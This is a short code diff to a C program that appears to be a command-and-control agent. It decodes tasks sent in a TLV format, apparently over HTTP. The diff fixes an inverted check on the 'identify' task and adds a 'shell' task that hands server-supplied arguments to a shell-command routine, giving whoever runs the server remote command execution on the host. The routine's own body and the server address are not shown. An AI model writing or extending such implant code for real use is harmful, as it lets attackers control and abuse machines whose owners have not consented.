@@ -4,8 +4,8 @@
 
 #include <init.h>
 #include <http_client.h>
+#include <commands.h>
 #include <communication.h>
-#include <tlv.h>
 
 #include <config.h>
 
@@ -46,14 +46,23 @@ int main() {
         taskName[taskNameSize] = 0x00;
 
         int argBytes = extractInt32(&tasksTLV); 
-        char * args = malloc(argBytes);
+        char * args = malloc(argBytes + 1);
         extractBytes(&tasksTLV, argBytes, args);
-        
-        printf("[+] got task id: %u\n", taskId);
-        printf("    | TaskName: %s\n", taskName); 
+        args[argBytes] = 0x00;
 
-        if (strcmp(taskName, "identify") != 0) 
+        struct TLVBuild tlvArgs;
+        tlvArgs.buf = args;
+        tlvArgs.bufsize = argBytes + 1;
+        tlvArgs.allocsize = argBytes + 1;
+
+        printf("[+] Got task ID: %u\n", taskId);
+        printf("    -> TaskName: %s\n", taskName); 
+        printf("    -> ArgsBuf: %.*s (%u bytes)\n", tlvArgs.bufsize, tlvArgs.buf, tlvArgs.bufsize); 
+
+        if (strcmp(taskName, "identify") == 0) 
           agent_identify(taskId);
+        else if (strcmp(taskName, "shell") == 0)
+          shell_cmd(taskId, extractInt32(&tlvArgs), &tlvArgs);
 
         free(args);
         free(taskName);
